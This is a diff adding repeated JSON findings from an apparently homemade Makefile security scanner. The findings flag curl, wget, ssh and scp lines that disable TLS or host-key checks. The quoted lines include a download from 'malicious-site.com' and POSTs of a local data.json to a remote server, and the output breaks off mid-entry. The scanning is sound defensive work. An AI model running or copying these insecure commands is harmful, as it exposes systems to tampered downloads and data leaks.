@@ -382,4 +382,1156 @@
         "Issue": "Plaintext HTTP connection with curl or wget",
         "Severity": "Warn"
     }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/Makefile",
+        "LineNumber": 9,
+        "Line": "- curl -k http://malicious-site.com/file -o downloaded_file",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data5/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/Makefile",
+        "LineNumber": 9,
+        "Line": "- curl -k http://malicious-site.com/file -o downloaded_file",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 21,
+        "Line": "/opt/widgetco/bin/curl -k -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "curl --insecure -X POST -H \"Content-Type: application/json\" -d @./data.json https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "curl -k -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 40,
+        "Line": "curl http://example.com > /dev/null",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/curl_examples.Makefile",
+        "LineNumber": 45,
+        "Line": "curl --insecure -O https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/sample_data6/wget_examples.Makefile",
+        "LineNumber": 36,
+        "Line": "wget --spider http://example.com",
+        "Issue": "Plaintext HTTP connection with curl or wget",
+        "Severity": "Warn"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 3,
+        "Line": "SSH_OPTS := -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 15,
+        "Line": "/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 19,
+        "Line": "/usr/bin/scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 25,
+        "Line": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com \"cd target_directory; build_command\"",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/ssh_examples.Makefile",
+        "LineNumber": 26,
+        "Line": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@example.com:target_directory/copy_files_command source_directory",
+        "Issue": "Disabled host key checking with SSH or SCP",
+        "Severity": "Error"
+    }
+][
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 20,
+        "Line": "wget --no-check-certificate --post-file=./data.json --header=\"Content-Type: application/json\" -O- https://remoteserver.com/",
+        "Issue": "Insecure SSL/TLS connection with curl or wget",
+        "Severity": "Error"
+    },
+    {
+        "FileName": "/Users/logangarrett03/Desktop/git/Soteria/Files/sample_data2/wget_examples.Makefile",
+        "LineNumber": 31,
+        "Line": "wget --no-check-certificate https://installer.com/installer.zip",
